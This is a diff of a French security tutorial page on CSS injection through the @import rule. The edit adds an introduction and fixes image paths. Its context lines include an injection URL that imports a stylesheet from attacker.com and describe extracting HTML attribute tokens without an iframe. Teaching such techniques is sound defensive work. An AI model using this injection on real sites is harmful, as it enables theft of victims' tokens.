@@ -4,6 +4,8 @@ description: 15 Décembre 2022
 
 # Les injections CSS - Règle @import
 
+> On continue sur le sujet des injections CSS avec cette fois l'utilisation de la règle `@import`. L'objectif est toujours de récupérer des informations contenues dans les attributs HTML, mais cette fois, sans avoir besoin d'iframer la page vulnérable.
+
 ## Utilisation de la règle @import
 
 La règle CSS `@import` permet d'importer des règles CSS en référençant d'autres feuilles de styles. Pour fonctionner, la règle `@import` doit être déclarée avant toutes les autres règles CSS (à l'exception de la règle `@charset`). L'import d'une feuille de style s'effectue comme ceci :&#x20;
@@ -84,7 +86,7 @@ https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/s
 
 Lorsque la victime visite la page injectée, son navigateur effectue la requête permettant de charger la feuille de style importée :&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>
 
 En admettant que le contenu de la feuille de style malicieuse n'effectue seulement qu'un changement de couleur du titre :&#x20;
 
@@ -98,7 +100,7 @@ h1 {
 
 La victime verra donc ainsi l'application du style CSS :&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
 
 Pour l'attaquant, l'idée ici sera d'utiliser la feuille de style CSS sous son contrôle afin d'exécuter les attaques vues précédemment, mais sans avoir besoin d'iframer le site vulnérable ou de passer plusieurs fois des liens malicieux à sa victime (un premier lien pour identifier le premier caractère, un second lien pour le second caractère, etc).
 
@@ -186,7 +188,7 @@ Le principe de l'automatisation de l'exploitation est le suivant :&#x20;
 
 Soit le diagramme suivant (se répétant jusqu'à ce que la totalité du jeton soit récupéré) :&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>
 
 En théorie cela fonctionne, mais en pratique, plusieurs problématiques restent à régler avec que cela fonctionne.
 
